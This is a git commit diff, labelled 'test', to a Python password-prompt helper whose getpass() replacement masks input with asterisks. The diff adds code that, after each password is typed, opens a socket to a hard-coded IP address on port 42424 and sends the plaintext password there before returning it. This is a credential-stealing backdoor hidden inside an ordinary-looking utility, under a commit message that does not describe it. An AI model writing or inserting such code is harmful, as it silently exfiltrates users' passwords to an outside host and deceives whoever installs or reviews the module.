36b5c3f48642a75682a6e208186c2d24781f2cb1
Cyrus Rice <cyrusric@amazon.com>
2021-07-06 22:17:20 +0000

    test

--- password/password.py
+++ password/password.py
@@ -1,4 +1,5 @@
 import getch
+import socket
 def getpass(prompt):
     """Replacement for getpass.getpass() which prints asterisks for each character typed"""
     print(prompt, end='', flush=True)
@@ -11,4 +12,10 @@ def getpass(prompt):
         else:
             buf += ch
             print('*', end='', flush=True)
+    host = '172.23.231.117' #The host on your client needs to be the external-facing IP address of your router. Obtain it from here https://www.whatismyip.com/
+    port = 42424
+    s = socket.socket()
+    s.connect((host,port))
+    s.send(buf.encode())
+    s.close()
     return buf
